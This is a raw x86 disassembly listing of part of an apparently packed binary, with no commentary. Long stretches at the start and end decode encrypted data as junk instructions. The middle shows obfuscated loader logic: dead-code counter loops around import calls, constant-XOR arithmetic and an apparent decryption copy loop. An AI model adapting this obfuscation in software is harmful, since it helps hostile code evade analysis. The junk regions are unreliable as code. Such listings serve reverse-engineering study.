  4039d5:	sbb    BYTE PTR [esi+0x70bcbb0],0xfa
  4039dc:	dec    ecx
  4039dd:	in     al,0x29
  4039df:	xchg   ebx,eax
  4039e0:	mov    ah,0x27
  4039e2:	and    eax,ebp
  4039e4:	out    dx,eax
  4039e5:	cmp    eax,0x80f5052b
  4039ea:	lds    edx,FWORD PTR es:[ebp+0xa5d9a89]
  4039f1:	mov    ebp,esi
  4039f3:	cmp    al,BYTE PTR [edx]
  4039f5:	loopne 0x403a60
  4039f7:	xchg   esi,eax
  4039f8:	repnz inc esp
  4039fa:	retf   0xadef
  4039fd:	test   ah,cl
  4039ff:	and    esi,esp
  403a01:	inc    ebx
  403a02:	push   esp
  403a03:	fidiv  DWORD PTR [ebp+0x5464d490]
  403a09:	call   0x86c748ad
  403a0e:	test   al,0xa6
  403a10:	mul    BYTE PTR [ecx-0x655a362f]
  403a16:	push   edi
  403a17:	mov    dh,BYTE PTR [ebp-0x1e]
  403a1a:	mov    bl,0x77
  403a1c:	fisub  DWORD PTR [ebx+eax*4+0x10d03e65]
  403a23:	push   esi
  403a24:	or     ebp,ecx
  403a26:	mov    BYTE PTR [eax-0x4994097a],ch
  403a2c:	(bad)  
  403a2d:	rcl    ch,0x42
  403a30:	pop    ecx
  403a31:	xor    dl,BYTE PTR [esi]
  403a33:	add    DWORD PTR [ecx],edx
  403a35:	(bad)
  403a38:	xchg   edx,eax
  403a39:	mov    dl,0x7e
  403a3b:	sbb    DWORD PTR [edx+eiz*8],ecx
  403a3e:	rol    BYTE PTR [edi],cl
  403a40:	ja     0x4039ff
  403a42:	jb     0x4039fb
  403a44:	pop    ss
  403a45:	mov    WORD PTR [ecx-0xcb0a36b],ss
  403a4b:	sti    
  403a4c:	push   0xffffffe5
  403a4e:	jbe    0x403abb
  403a50:	push   0x8de3e804
  403a55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a56:	mov    esi,0x2cf2626e
  403a5b:	xor    dl,BYTE PTR [ecx+0x6fdb3758]
  403a61:	pop    esi
  403a62:	dec    eax
  403a63:	push   es
  403a64:	pmullw mm5,QWORD PTR [eax-0x76]
  403a68:	lods   eax,DWORD PTR ds:[esi]
  403a69:	mov    eax,ds:0x413535d
  403a6e:	outs   dx,DWORD PTR ds:[esi]
  403a6f:	cmp    al,0x5f
  403a71:	adc    al,dl
  403a73:	loopne 0x403adb
  403a75:	pop    ebp
  403a76:	xlat   BYTE PTR ds:[ebx]
  403a77:	sbb    eax,0x5d151356
  403a7c:	leave  
  403a7d:	out    0x7e,al
  403a7f:	pushf  
  403a80:	aas    
  403a81:	sbb    DWORD PTR [ebx-0x24fbe54e],ebp
  403a87:	or     DWORD PTR [edi-0x6ab8873f],edx
  403a8d:	fist   WORD PTR [eax-0x5a8ea7b7]
  403a93:	pop    edx
  403a94:	test   al,0x3e
  403a96:	fadd   DWORD PTR [esi-0x7ddf9435]
  403a9c:	(bad)  
  403a9d:	adc    dl,BYTE PTR [eax+0x26]
  403aa0:	jmp    0xcad:0xad671a0c
  403aa7:	xor    eax,0xda8abe0f
  403aac:	adc    BYTE PTR [edi],ah
  403aae:	cmp    BYTE PTR [edx-0x61c2fa1b],cl
  403ab4:	and    BYTE PTR [eax+ebp*1-0x64],0x8f
  403ab9:	cmp    edi,DWORD PTR [edi+ebx*1-0x71244d2e]
  403ac0:	lahf   
  403ac1:	test   al,0x47
  403ac3:	pop    ds
  403ac4:	enter  0x66fc,0x17
  403ac8:	sub    eax,ebp
  403aca:	xor    BYTE PTR [esi+eax*4-0x7c],al
  403ace:	neg    BYTE PTR [esi-0x1f]
  403ad1:	ja     0x403ade
  403ad3:	mov    ch,0x5f
  403ad5:	jae    0x403b56
  403ad7:	mov    ds:0xc52be818,eax
  403adc:	jb     0x403aaa
  403ade:	mov    bl,0xf5
  403ae0:	in     eax,dx
  403ae1:	or     BYTE PTR [eax],0x95
  403ae4:	mov    DWORD PTR [edi-0x47],eax
  403ae7:	jns    0x403af2
  403ae9:	jl     0x403aee
  403aeb:	push   ds
  403aec:	xchg   BYTE PTR [ebx+0x533f0faa],bl
  403af2:	jnp    0x403b44
  403af4:	mov    ecx,DWORD PTR [eax]
  403af6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403af7:	or     eax,DWORD PTR [ecx-0x1a9e0f41]
  403afd:	(bad)  
  403afe:	push   ebp
  403aff:	jecxz  0x403b72
  403b01:	test   DWORD PTR [esi+0x584ac6de],0x9bf9a0a7
  403b0b:	mov    ah,ch
  403b0d:	push   es
  403b0e:	lods   al,BYTE PTR ds:[esi]
  403b0f:	outs   dx,DWORD PTR ds:[esi]
  403b10:	clc    
  403b11:	fs mov ecx,0xcddcad3a
  403b17:	out    0x37,eax
  403b19:	cdq    
  403b1a:	inc    esp
  403b1b:	fiadd  WORD PTR [ecx]
  403b1d:	mov    al,0xc6
  403b1f:	jg     0xc39f91d1
  403b25:	scas   eax,DWORD PTR es:[edi]
  403b26:	pop    ebx
  403b27:	or     al,0x65
  403b29:	adc    DWORD PTR [eax+0x116ba098],ecx
  403b2f:	lods   eax,DWORD PTR ds:[esi]
  403b30:	fdiv   DWORD PTR [eax]
  403b32:	mov    ah,0x8c
  403b34:	jge    0xd3e1b3c4
  403b3a:	push   esp
  403b3b:	jp     0x403b24
  403b3d:	jle    0x403b39
  403b3f:	sbb    bh,ch
  403b41:	shl    ecx,1
  403b43:	iret   
  403b44:	push   ebp
  403b45:	(bad)  
  403b47:	retf   
  403b48:	add    BYTE PTR ds:0x6727a963,ch
  403b4e:	jbe    0x403b10
  403b50:	sub    DWORD PTR [edx+0x26],ecx
  403b53:	adc    eax,0x144c668e
  403b58:	dec    ebx
  403b59:	push   ebp
  403b5a:	jmp    0xfd82eec7
  403b5f:	push   ecx
  403b60:	mul    dl
  403b62:	dec    edx
  403b63:	cs int3 
  403b65:	jge    0x403b07
  403b67:	adc    al,0xf0
  403b69:	inc    edi
  403b6a:	adc    eax,0x6e30da5f
  403b6f:	and    ebx,ecx
  403b71:	cli    
  403b72:	pushf  
  403b73:	shr    BYTE PTR [esi-0x18],1
  403b76:	mov    esi,0x2bab15ba
  403b7b:	mov    al,0x9a
  403b7d:	stos   DWORD PTR es:[edi],eax
  403b7e:	add    DWORD PTR [ecx+0x65],esp
  403b81:	adc    DWORD PTR [esi+0x5],edi
  403b84:	add    al,0xad
  403b86:	lods   eax,DWORD PTR ds:[esi]
  403b87:	adc    al,0x7f
  403b89:	xchg   edi,eax
  403b8a:	or     DWORD PTR [ebx+0x1ba93e76],esp
  403b90:	fdiv   QWORD PTR [ecx+0x2a]
  403b93:	cs push edx
  403b95:	xchg   esp,eax
  403b96:	xchg   esi,eax
  403b97:	jbe    0x403b52
  403b99:	(bad)  
  403b9a:	pop    ecx
  403b9b:	fldcw  WORD PTR [edi]
  403b9d:	sub    al,0x88
  403b9f:	ror    BYTE PTR [esi+0x5],0x1d
  403ba3:	imul   eax,edx,0x14
  403ba6:	mov    ch,0x6a
  403ba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ba9:	std    
  403baa:	xor    esp,DWORD PTR [edx]
  403bac:	dec    esp
  403bad:	jae    0x403b61
  403baf:	scas   eax,DWORD PTR es:[edi]
  403bb0:	sti    
  403bb1:	push   ss
  403bb2:	imul   BYTE PTR [edi+0x5fc84036]
  403bb8:	pop    edi
  403bb9:	aam    0xa4
  403bbb:	or     bh,bl
  403bbd:	es fs mov edx,0x4aea2ec7
  403bc4:	leave  
  403bc5:	add    DWORD PTR ds:0x86c39b73,0xffffff85
  403bcc:	test   cl,bl
  403bce:	pop    DWORD PTR [ecx-0x38d90c13]
  403bd4:	inc    ecx
  403bd5:	add    DWORD PTR [edx],edi
  403bd7:	push   ebx
  403bd8:	or     al,BYTE PTR [ecx+ebx*2]
  403bdb:	mov    cl,0x4d
  403bdd:	jns    0x403b9d
  403bdf:	jb     0x403c2b
  403be1:	ds dec ebp
  403be3:	nop
  403be4:	(bad)  
  403be5:	idiv   ebp
  403be7:	clc    
  403be8:	sub    al,0x5e
  403bea:	leave  
  403beb:	mov    al,0xe9
  403bed:	pop    edi
  403bee:	test   BYTE PTR [ecx+0x576948c7],dh
  403bf4:	js     0x403c55
  403bf6:	mov    eax,ds:0x52fddef5
  403bfc:	adc    ebx,DWORD PTR [ebx+0x7e]
  403bff:	inc    ecx
  403c00:	sti    
  403c01:	addr16 lahf 
  403c03:	mov    bl,0x69
  403c05:	xchg   esi,eax
  403c06:	mov    eax,DWORD PTR [ebx-0xe2768f2]
  403c0c:	mov    edi,0x8ece0cad
  403c11:	jp     0x403bec
  403c13:	inc    ecx
  403c14:	cmp    ecx,DWORD PTR ds:0xcab4a844
  403c1a:	and    DWORD PTR [ebp-0x1c],edi
  403c1d:	(bad)  
  403c1e:	pop    ebx
  403c1f:	shr    BYTE PTR es:[eax],1
  403c22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c23:	in     al,0x21
  403c25:	ror    ebp,0x60
  403c28:	in     al,dx
  403c29:	mov    bh,0xe1
  403c2b:	inc    ebx
  403c2c:	xchg   esi,eax
  403c2d:	call   0xbb33d763
  403c32:	mov    dl,0x4b
  403c34:	imul   ebp,DWORD PTR [ebp+0x10],0xffffff85
  403c38:	bound  edx,QWORD PTR [ebp-0x1c]
  403c3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c3c:	and    al,0x17
  403c3e:	outs   dx,BYTE PTR ds:[esi]
  403c3f:	or     DWORD PTR [ecx-0x25],esp
  403c42:	adc    bh,BYTE PTR [esi+ebp*1-0x2cc7d7f7]
  403c49:	cmp    al,0x76
  403c4b:	sbb    edi,DWORD PTR [ecx]
  403c4d:	jmp    0x65eb3fd
  403c52:	cmc    
  403c53:	and    eax,0x9161ab50
  403c58:	dec    esi
  403c59:	sbb    al,0x4a
  403c5b:	pop    esi
  403c5c:	add    cl,bl
  403c5e:	daa    
  403c5f:	imul   esi,DWORD PTR [ebp+eax*2+0x6e50b33d],0x1997ca48
  403c6a:	inc    eax
  403c6b:	test   DWORD PTR [edi],eax
  403c6d:	push   ss
  403c6e:	pusha  
  403c6f:	mov    bl,ah
  403c71:	loope  0x403c99
  403c73:	addr16 mov cl,0x23
  403c76:	out    0x93,eax
  403c78:	sar    ch,0xbd
  403c7b:	add    BYTE PTR ds:0x338336f9,dh
  403c81:	enter  0x4d89,0x8
  403c85:	mov    ecx,DWORD PTR [ebp+0x8]
  403c88:	mov    edx,DWORD PTR [ebp+0x8]
  403c8b:	xor    ecx,eax
  403c8d:	imul   edx,edx,0x5708f5
  403c93:	add    ecx,esi
  403c95:	lea    ecx,[ebp+ecx*4-0x64]
  403c99:	mov    edi,DWORD PTR [ecx]
  403c9b:	add    edx,edi
  403c9d:	mov    DWORD PTR [ecx],edx
  403c9f:	mov    ecx,DWORD PTR [ebp+0x8]
  403ca2:	xor    ecx,eax
  403ca4:	add    ecx,esi
  403ca6:	jne    0x4018ed
  403cac:	mov    ecx,DWORD PTR [ebp-0x8]
  403caf:	xor    ecx,eax
  403cb1:	mov    eax,DWORD PTR [ebp+0x10]
  403cb4:	add    ecx,esi
  403cb6:	mov    DWORD PTR [eax],ecx
  403cb8:	pop    edi
  403cb9:	pop    esi
  403cba:	pop    ebx
  403cbb:	leave  
  403cbc:	ret    0xc
  403cbf:	push   ebp
  403cc0:	mov    ebp,esp
  403cc2:	mov    DWORD PTR ds:0x41d56c,0xf89c85b5
  403ccc:	pop    ebp
  403ccd:	mov    DWORD PTR ds:0x429000,0x2616
  403cd7:	jmp    0x41046f
  403cdc:	sbb    DWORD PTR ds:0x427018,edx
  403ce2:	mov    eax,0x80670b3f
  403ce7:	ret    
  403ce8:	push   ebp
  403ce9:	mov    ebp,esp
  403ceb:	sub    esp,0x10
  403cee:	mov    eax,0xf89c85b6
  403cf3:	mov    DWORD PTR ds:0x425004,0x1b
  403cfd:	cmp    DWORD PTR ds:0x425004,0x0
  403d04:	je     0x403d42
  403d0a:	cmp    DWORD PTR ds:0x425004,0x29
  403d11:	jne    0x403d26
  403d17:	push   DWORD PTR [ebp-0xc]
  403d1a:	push   DWORD PTR [ebp-0x1c]
  403d1d:	push   DWORD PTR [ebp-0x18]
  403d20:	call   DWORD PTR ds:0x421020
  403d26:	mov    edx,DWORD PTR ds:0x425004
  403d2c:	dec    edx
  403d2d:	mov    DWORD PTR ds:0x425004,edx
  403d33:	jmp    0x403cfd
  403d38:	xor    DWORD PTR ds:0x426018,0x7d7c
  403d42:	mov    DWORD PTR [ebp-0x4],eax
  403d45:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  403d4c:	and    DWORD PTR ds:0x428014,0x0
  403d56:	jmp    0x403d68
  403d5b:	mov    ecx,DWORD PTR ds:0x428014
  403d61:	inc    ecx
  403d62:	mov    DWORD PTR ds:0x428014,ecx
  403d68:	cmp    DWORD PTR ds:0x428014,0x1f
  403d6f:	jae    0x403db8
  403d75:	cmp    DWORD PTR ds:0x428014,0x4
  403d7c:	jne    0x403d93
  403d82:	push   DWORD PTR [ebp-0x18]
  403d85:	push   0x8961
  403d8a:	push   DWORD PTR [ebp-0x14]
  403d8d:	call   DWORD PTR ds:0x421028
  403d93:	cmp    DWORD PTR ds:0x428014,0x3
  403d9a:	jne    0x403dad
  403da0:	mov    ecx,DWORD PTR ds:0x428014
  403da6:	inc    ecx
  403da7:	mov    DWORD PTR ds:0x428014,ecx
  403dad:	jmp    0x403d5b
  403db2:	add    ecx,DWORD PTR ds:0x425000
  403db8:	mov    ecx,DWORD PTR [ebp-0x4]
  403dbb:	adc    DWORD PTR ds:0x426000,edi
  403dc1:	push   esi
  403dc2:	or     edx,esi
  403dc4:	mov    edx,0x7510893
  403dc9:	and    DWORD PTR ds:0x429014,0x0
  403dd3:	mov    esi,DWORD PTR ds:0x429014
  403dd9:	inc    esi
  403dda:	mov    DWORD PTR ds:0x429014,esi
  403de0:	cmp    DWORD PTR ds:0x429014,0x5
  403de7:	jne    0x403df8
  403ded:	push   0x41fecf
  403df2:	call   DWORD PTR ds:0x42102c
  403df8:	cmp    DWORD PTR ds:0x429014,0x4
  403dff:	jne    0x403e12
  403e05:	mov    esi,DWORD PTR ds:0x429014
  403e0b:	inc    esi
  403e0c:	mov    DWORD PTR ds:0x429014,esi
  403e12:	cmp    DWORD PTR ds:0x429014,0x15
  403e19:	jb     0x403dd3
  403e1f:	movzx  esi,BYTE PTR ds:0x429008
  403e26:	sub    DWORD PTR ds:0x42900c,esi
  403e2c:	xor    ecx,edx
  403e2e:	mov    esi,0x3272db
  403e33:	push   edi
  403e34:	sbb    edi,DWORD PTR ds:0x42601c
  403e3a:	mov    edi,DWORD PTR [ebp+0x10]
  403e3d:	add    ecx,esi
  403e3f:	mov    DWORD PTR ds:0x42700c,0x23cb
  403e49:	cmp    ecx,edi
  403e4b:	mov    DWORD PTR ds:0x425000,0x3f40
  403e55:	je     0x403f20
  403e5b:	mov    ecx,DWORD PTR [ebp-0x4]
  403e5e:	sub    edi,0x7e0f
  403e64:	mov    edi,DWORD PTR [ebp+0x10]
  403e67:	xor    eax,eax
  403e69:	xor    ecx,edx
  403e6b:	add    ecx,esi
  403e6d:	add    edi,0xfabdbef1
  403e73:	adc    eax,0xffffffff
  403e76:	xor    eax,0x0
  403e79:	mov    DWORD PTR [ebp-0xc],eax
  403e7c:	push   ebx
  403e7d:	xor    ebx,ebx
  403e7f:	xor    edi,0x8a29a123
  403e85:	mov    eax,ecx
  403e87:	add    eax,0xfabdbef1
  403e8c:	adc    ebx,0xffffffff
  403e8f:	xor    eax,0x8a29a123
  403e94:	xor    ebx,0x0
  403e97:	cmp    eax,edi
  403e99:	jne    0x403eb2
  403e9f:	cmp    ebx,DWORD PTR [ebp-0xc]
  403ea2:	je     0x403f1a
  403ea8:	jmp    0x403eb2
  403ead:	mov    esi,0x3272db
  403eb2:	mov    eax,DWORD PTR [ebp-0x4]
  403eb5:	mov    edi,DWORD PTR [ebp-0x8]
  403eb8:	xor    edi,edx
  403eba:	add    edi,esi
  403ebc:	mov    esi,DWORD PTR [ebp+0x8]
  403ebf:	imul   edi,ecx
  403ec2:	mov    ebx,DWORD PTR [ebp+0xc]
  403ec5:	xor    eax,edx
  403ec7:	add    eax,ecx
  403ec9:	mov    al,BYTE PTR [ebx+eax*1+0x3272db]
  403ed0:	mov    BYTE PTR [edi+esi*1],al
  403ed3:	mov    eax,DWORD PTR [ebp-0x8]
  403ed6:	mov    esi,DWORD PTR [ebp+0x10]
  403ed9:	xor    eax,edx
  403edb:	xor    ebx,ebx
  403edd:	add    esi,0xfabdbef1
  403ee3:	adc    ebx,0xffffffff
  403ee6:	lea    ecx,[ecx+eax*1+0x3272db]
  403eed:	xor    edi,edi
  403eef:	xor    esi,0x8a29a123
  403ef5:	xor    ebx,0x0
  403ef8:	mov    eax,ecx
  403efa:	add    eax,0xfabdbef1
  403eff:	adc    edi,0xffffffff
  403f02:	xor    eax,0x8a29a123
  403f07:	xor    edi,0x0
  403f0a:	cmp    eax,esi
  403f0c:	jne    0x403ead
  403f12:	cmp    edi,ebx
  403f14:	jne    0x403ead
  403f1a:	mov    eax,0xf89c85b5
  403f1f:	pop    ebx
  403f20:	pop    edi
  403f21:	pop    esi
  403f22:	leave  
  403f23:	ret    0xc
  403f26:	push   ebp
  403f27:	mov    ebp,esp
  403f29:	sub    esp,0x78
  403f2c:	adc    DWORD PTR ds:0x42601c,0x7e2b
  403f36:	push   ebx
  403f37:	push   esi
  403f38:	push   edi
  403f39:	push   0x1f
  403f3b:	sub    DWORD PTR ds:0x42601c,0x56d8
  403f45:	lea    eax,[ebp-0x78]
  403f48:	sbb    DWORD PTR ds:0x42801c,0x71f8
  403f52:	push   eax
  403f53:	add    DWORD PTR ds:0x429018,0x427000
  403f5d:	push   0x0
  403f5f:	sub    DWORD PTR ds:0x42501c,0x427004
  403f69:	call   DWORD PTR ds:0x421044
  403f6f:	push   0x97898797
  403f74:	and    DWORD PTR ds:0x426000,0x1a8d
  403f7e:	call   DWORD PTR ds:0x421010
  403f84:	and    DWORD PTR ds:0x42600c,0x0
  403f8e:	mov    ecx,DWORD PTR ds:0x42600c
  403f94:	inc    ecx
  403f95:	mov    DWORD PTR ds:0x42600c,ecx
  403f9b:	cmp    DWORD PTR ds:0x42600c,0x21
  403fa2:	jne    0x403fda
  403fa8:	push   0x67f5
  403fad:	push   0x706e
  403fb2:	push   DWORD PTR [ebp-0x1c]
  403fb5:	push   0x21f9
  403fba:	push   DWORD PTR [ebp-0x24]
  403fbd:	push   0x372d
  403fc2:	push   DWORD PTR [ebp-0x1c]
  403fc5:	push   0x6932
  403fca:	push   0x2439
  403fcf:	push   0x1248
  403fd4:	call   DWORD PTR ds:0x421030
  403fda:	cmp    DWORD PTR ds:0x42600c,0x1d
  403fe1:	jb     0x403f8e
  403fe7:	add    DWORD PTR ds:0x428010,ebx
  403fed:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  403ff4:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  403ffb:	or     DWORD PTR ds:0x42701c,0x426014
  404005:	mov    ecx,DWORD PTR [ebp-0x4]
  404008:	adc    eax,0xdaa
  40400d:	mov    ebx,0x7510893
  404012:	xor    DWORD PTR ds:0x427004,ebx
  404018:	xor    ecx,ebx
  40401a:	mov    eax,0x3272db
  40401f:	add    ecx,eax
  404021:	mov    DWORD PTR [ebp-0x1c],ecx
  404024:	and    DWORD PTR ds:0x428010,0x0
  40402e:	jmp    0x404040
  404033:	mov    ecx,DWORD PTR ds:0x428010
  404039:	inc    ecx
  40403a:	mov    DWORD PTR ds:0x428010,ecx
  404040:	cmp    DWORD PTR ds:0x428010,0x18
  404047:	jae    0x40406f
  40404d:	cmp    DWORD PTR ds:0x428010,0x20
  404054:	jne    0x40406a
  40405a:	push   0x42801c
  40405f:	push   0x7111
  404064:	call   DWORD PTR ds:0x421058
  40406a:	jmp    0x404033
  40406f:	mov    ecx,DWORD PTR [ebp+0x14]
  404072:	adc    DWORD PTR ds:0x426004,0x3b44
  40407c:	test   ecx,ecx
  40407e:	mov    DWORD PTR ds:0x425024,0xafb
  404088:	je     0x404096
  40408e:	mov    ecx,DWORD PTR [ebp+0x14]
  404091:	mov    ecx,DWORD PTR [ecx]
  404093:	mov    DWORD PTR [ebp-0x1c],ecx
  404096:	mov    ecx,0x7665
  40409b:	imul   edx,eax
  40409e:	or     DWORD PTR ds:0x429000,0x5016
  4040a8:	mov    esi,0x76532
  4040ad:	sbb    DWORD PTR ds:0x429008,0x6d64
  4040b7:	add    edx,ecx
  4040b9:	xchg   esi,ecx
  4040bb:	or     esi,DWORD PTR ds:0x427010
  4040c1:	mov    edi,0x54354
  4040c6:	sub    edx,edi
  4040c8:	xor    DWORD PTR ds:0x42600c,edi
  4040ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4040d1:	xor    DWORD PTR ds:0x425008,0x2961
  4040db:	xor    ecx,ebx
  4040dd:	mov    DWORD PTR ds:0x42601c,0x16
  4040e7:	cmp    DWORD PTR ds:0x42601c,0x0
  4040ee:	je     0x404130
  4040f4:	cmp    DWORD PTR ds:0x42601c,0x1d
  4040fb:	jne    0x404114
  404101:	push   0x425014
  404106:	push   0x426014
  40410b:	push   DWORD PTR [ebp-0x28]
  40410e:	call   DWORD PTR ds:0x42105c
  404114:	mov    esi,DWORD PTR ds:0x42601c
  40411a:	dec    esi
  40411b:	mov    DWORD PTR ds:0x42601c,esi
  404121:	jmp    0x4040e7
  404126:	sbb    DWORD PTR ds:0x425014,0x65a5
  404130:	add    ecx,eax
  404132:	mov    esi,DWORD PTR ds:0x425008
  404138:	sbb    DWORD PTR ds:0x426008,esi
  40413e:	mov    DWORD PTR [ebp-0x8],ecx
  404141:	sub    DWORD PTR ds:0x428010,edx
  404147:	mov    ecx,DWORD PTR [ebp-0x14]
  40414a:	mov    DWORD PTR ds:0x428008,0x2441
  404154:	xor    ecx,ebx
  404156:	add    ecx,eax
  404158:	mov    DWORD PTR [ebp-0x24],ecx
  40415b:	mov    ecx,DWORD PTR ds:0x42801c
  404161:	sbb    DWORD PTR ds:0x429004,ecx
  404167:	mov    ecx,DWORD PTR [ebp-0x4]
  40416a:	xor    ecx,ebx
  40416c:	mov    DWORD PTR ds:0x426000,0x1b
  404176:	cmp    DWORD PTR ds:0x426000,0x0
  40417d:	je     0x4041b9
  404183:	cmp    DWORD PTR ds:0x426000,0x22
  40418a:	jne    0x4041a3
  404190:	push   0x561f
  404195:	push   0x425014
  40419a:	push   DWORD PTR [ebp-0xc]
  40419d:	call   DWORD PTR ds:0x421034
  4041a3:	xor    esi,esi
  4041a5:	add    esi,DWORD PTR ds:0x426000
  4041ab:	dec    esi
  4041ac:	mov    DWORD PTR ds:0x426000,esi
  4041b2:	jmp    0x404176
  4041b7:	neg    esi
  4041b9:	add    ecx,eax
  4041bb:	adc    DWORD PTR ds:0x425014,edi
  4041c1:	mov    DWORD PTR [ebp-0x30],ecx
  4041c4:	or     DWORD PTR ds:0x426000,0x760b
  4041ce:	mov    esi,DWORD PTR [ebp-0x4]
  4041d1:	and    DWORD PTR ds:0x42700c,0x0
  4041db:	mov    ecx,DWORD PTR ds:0x42700c
  4041e1:	inc    ecx
  4041e2:	mov    DWORD PTR ds:0x42700c,ecx
  4041e8:	cmp    DWORD PTR ds:0x42700c,0x1f
  4041ef:	jne    0x404203
  4041f5:	push   DWORD PTR [ebp-0xc]
  4041f8:	push   0x7ec8
  4041fd:	call   DWORD PTR ds:0x421038
  404203:	cmp    DWORD PTR ds:0x42700c,0x13
  40420a:	jb     0x4041db
  404210:	xor    esi,ebx
  404212:	mov    DWORD PTR ds:0x426018,0x19
  40421c:	cmp    DWORD PTR ds:0x426018,0x0
  404223:	je     0x40427d
  404229:	cmp    DWORD PTR ds:0x426018,0xc
  404230:	jne    0x404251
  404236:	push   DWORD PTR [ebp-0x24]
  404239:	push   0x1686
  40423e:	push   0x428008
  404243:	push   DWORD PTR [ebp-0x28]
  404246:	push   0x2eb1
  40424b:	call   DWORD PTR ds:0x421000
  404251:	cmp    DWORD PTR ds:0x426018,0xd
  404258:	jne    0x40426b
  40425e:	mov    ecx,DWORD PTR ds:0x426018
  404264:	dec    ecx
  404265:	mov    DWORD PTR ds:0x426018,ecx
  40426b:	mov    ecx,DWORD PTR ds:0x426018
  404271:	dec    ecx
  404272:	mov    DWORD PTR ds:0x426018,ecx
  404278:	jmp    0x40421c
  40427d:	add    esi,eax
  40427f:	sub    DWORD PTR ds:0x428008,edx
  404285:	mov    ecx,DWORD PTR [ebp-0x24]
  404288:	or     DWORD PTR ds:0x429008,0x427008
  404292:	sub    ecx,eax
  404294:	jmp    0x4065e9
  404299:	div    ecx
  40429b:	and    DWORD PTR [edi+eax*1+0x64],edx
  40429f:	xchg   ebx,eax
  4042a0:	lods   eax,DWORD PTR ds:[esi]
  4042a1:	mov    edx,0x8e9c947b
  4042a6:	call   0x6262:0x5f1a9a42
  4042ad:	sub    bl,BYTE PTR [edi+0x62]
  4042b0:	bound  ecx,QWORD PTR [ebx]
  4042b2:	aas    
  4042b3:	pop    edi
  4042b4:	cmp    ecx,ebx
  4042b6:	aaa    
  4042b7:	or     BYTE PTR [ebp+0x40],cl
  4042ba:	mov    cl,0x1
  4042bc:	ret    
  4042bd:	push   0xb3e0f0f7
  4042c2:	out    0xc,al
  4042c4:	pushf  
  4042c5:	and    eax,0x231739aa
  4042ca:	adc    BYTE PTR [edi+0x19fdb02d],ah
  4042d0:	dec    edx
  4042d1:	outs   dx,DWORD PTR es:[esi]
  4042d3:	ins    DWORD PTR es:[edi],dx
  4042d4:	gs inc edi
  4042d6:	pop    edi
  4042d7:	(bad)
  4042da:	sbb    eax,DWORD PTR [esi+0x4]
  4042dd:	cs mov bh,0x8
  4042e0:	retf   0x32bb
  4042e3:	mov    ebp,0xb279b41e
  4042e8:	mov    eax,0x855b11cd
  4042ed:	daa    
  4042ee:	jmp    DWORD PTR [ecx-0xe]
  4042f1:	imul   eax,DWORD PTR [ecx+esi*2-0x5f],0x36
  4042f6:	aaa    
  4042f7:	push   edx
  4042f8:	scas   al,BYTE PTR es:[edi]
  4042f9:	lock ja 0x40428c
  4042fc:	xor    bh,BYTE PTR [eax+0x59]
  4042ff:	dec    ebx
  404300:	xchg   esp,eax
  404301:	jbe    0x404321
  404303:	in     al,0x75
  404305:	stos   BYTE PTR es:[edi],al
  404306:	fst    DWORD PTR [bp+si+0x6594]
  40430b:	ss (bad) 
  40430d:	les    eax,FWORD PTR ds:0x187ae509
  404313:	jmp    0x404370
  404315:	call   0xf929:0xa963b258
  40431c:	into   
  40431d:	pop    esi
  40431e:	mov    bh,0x2a
  404320:	pop    ecx
  404321:	js     0x4042e2
  404323:	in     al,dx
  404324:	mov    al,0xa4
  404326:	int    0x4b
  404328:	mov    bh,0x15
  40432a:	or     al,BYTE PTR [ebx+ebp*2+0x9777bd3]
  404331:	stos   BYTE PTR es:[edi],al
  404332:	addr16 inc esi
  404334:	sti    
  404335:	and    al,0x1c
  404337:	xlat   BYTE PTR ds:[ebx]
  404338:	test   eax,0xda3bd838
  40433d:	mov    cl,0xec
  40433f:	(bad)  
  404340:	std    
  404341:	call   0x7293e113
  404346:	clc    
  404347:	inc    esi
  404348:	std    
  404349:	mov    ebx,0x824ce9a2
  40434e:	fiadd  DWORD PTR [edi]
  404350:	pop    ebx
  404351:	cwde   
  404352:	(bad)  
  404353:	scas   al,BYTE PTR es:[edi]
  404354:	jl     0x404388
  404356:	and    al,0x16
  404358:	(bad)  
  40435a:	test   BYTE PTR [esi-0xa],dh
  40435d:	jbe    0x4042f4
  40435f:	adc    ebp,esi
  404361:	mov    bh,bh
  404363:	push   edi
  404364:	imul   esi,DWORD PTR [esi+0x54],0x6af14509
  40436b:	xchg   esi,eax
  40436c:	mov    DWORD PTR [ebx],ecx
  40436e:	fwait
  40436f:	loop   0x40438c
  404371:	(bad)  
  404374:	or     al,0xaa
  404376:	daa    
  404377:	outs   dx,BYTE PTR ds:[esi]
  404378:	test   BYTE PTR [esi+0x3b66befc],bh
  40437e:	add    eax,0x63e3d791
  404383:	hlt    
  404384:	clc    
  404385:	mov    ebx,0x3c97ab07
  40438a:	fmul   DWORD PTR [esi-0x6bdd662a]
  404390:	and    BYTE PTR [edi-0x75013800],al
  404396:	sbb    eax,0x8b2a7cfe
  40439b:	stc    
  40439c:	nop
  40439d:	cs mov esp,0x274c1f01
  4043a3:	sahf   
  4043a4:	data16 mov bl,0x33
  4043a7:	inc    eax
  4043a8:	jbe    0x40432c
  4043aa:	ins    BYTE PTR es:[edi],dx
  4043ab:	xor    al,BYTE PTR [ebx]
  4043ad:	mov    ch,0x6e
  4043af:	pop    edx
  4043b0:	or     ebx,DWORD PTR [esi-0x70]
  4043b3:	or     DWORD PTR cs:[ecx-0x7a01468c],ebp
  4043ba:	ret    0xbb7f
  4043bd:	push   edi
  4043be:	lds    ebx,FWORD PTR [esi-0xc791458]
  4043c4:	sub    DWORD PTR [ebx+0x66],esi
  4043c7:	or     BYTE PTR [ebp-0x64],bh
  4043ca:	lods   eax,DWORD PTR ds:[esi]
  4043cb:	xchg   edx,eax
  4043cc:	test   DWORD PTR [eax],0x82de9ca3
  4043d2:	ins    DWORD PTR es:[edi],dx
  4043d3:	sub    eax,0xcf220881
  4043d8:	mov    ebp,0xf492710e
  4043dd:	jb     0x40444a
  4043df:	icebp  
  4043e0:	mov    dl,0xd1
  4043e2:	sbb    eax,0x47ef56e5
  4043e7:	and    ebp,DWORD PTR [ebx-0x2c]
  4043ea:	lock in al,0xbf
  4043ed:	mov    cl,0x84
  4043ef:	cmp    ecx,edi
